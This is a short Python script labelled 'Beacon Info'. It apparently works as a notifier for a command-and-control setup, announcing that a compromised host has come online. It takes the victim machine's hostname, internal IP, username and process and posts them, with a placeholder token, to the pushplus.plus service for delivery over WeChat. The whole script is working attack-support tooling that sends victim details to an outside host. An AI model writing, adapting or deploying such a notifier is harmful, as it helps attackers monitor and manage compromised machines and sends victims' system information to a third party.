# encoding:utf-8
import argparse
import requests
import random
import string
import json


token = 'xxxxxxxxxxxxxxxxxxxxxxxx' #在 http://www.pushplus.plus/push1.html 复制

parser = argparse.ArgumentParser(description='Beacon Info')
parser.add_argument('--computername')
parser.add_argument('--internalip')
parser.add_argument('--username')
parser.add_argument('--process')
args = parser.parse_args()

internalip = args.internalip
computername = args.computername
username = args.username
process = args.process
ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))

title = "测试"
content = """

**主机已上线**

**主机名: {}**

**IP: {}**

**用户名: {}**

**进程: {}**

**Token: {}**

""".format(computername, internalip, username, process, ran_str)

url = 'http://www.pushplus.plus/send'
data = {
    "token":token,
    "title":title,
    "content":content,
    "template":"markdown",
    "channel":"wechat"
}
body=json.dumps(data).encode(encoding='utf-8')
headers = {'Content-Type':'application/json'}
requests.post(url,data=body,headers=headers)